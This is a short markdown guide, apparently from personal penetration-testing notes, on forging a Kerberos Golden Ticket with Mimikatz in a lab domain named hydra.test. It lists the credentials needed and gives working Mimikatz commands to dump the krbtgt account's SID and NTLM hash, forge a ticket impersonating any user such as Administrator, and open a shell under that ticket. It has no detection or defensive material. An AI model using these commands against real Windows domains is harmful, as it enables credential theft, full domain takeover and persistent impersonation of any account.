# Golden Ticket Attack

With just a couple pieces of information, you can create a ticket that can be used to impersonate any user across the domain.

## Required pieces of information

1. The name of the user account to impersonate
    * i.e., Administrator
2. The user ID of the user account to impersonate
    * i.e., 500
3. The name of the domain
    * i.e., hydra.test
4. The SID of the Kerberos Ticket Granting Ticket (**krbtgt**) account
    * i.e., S-1-5-21-849420856-2351964222-986696166
5. The NTLM hash of the Kerberos Ticket Granting Ticket (**krbtgt**) account

## Mimikatz

Run *lsadump::lsa* against the **krbtgt** account to obtain its SID and NTLM hash.

```powershell
mimikatz: lsadump::lsa /inject /name:krbtgt
```

![Obtaining information for golden ticket using Mimikatz's lsadump](photos/golden-ticket-lsadump.png)

Create the golden ticket.

```powershell
mimikatz: kerberos::golden /user:$TARGET_USER_NAME /domain:$DOMAIN_NAME /sid:$KRBTGT_SID /krbtgt:$KRBTGT_NTLM /id:$TARGET_USER_ID
```

![Creating a golden ticket using Mimikatz](photos/golden-ticket-kerberos-golden.png)

Open up a new command prompt that leverages the golden ticket (must be in a GUI session to access the new command prompt).

```powershell
mimikatz: misc::cmd
```
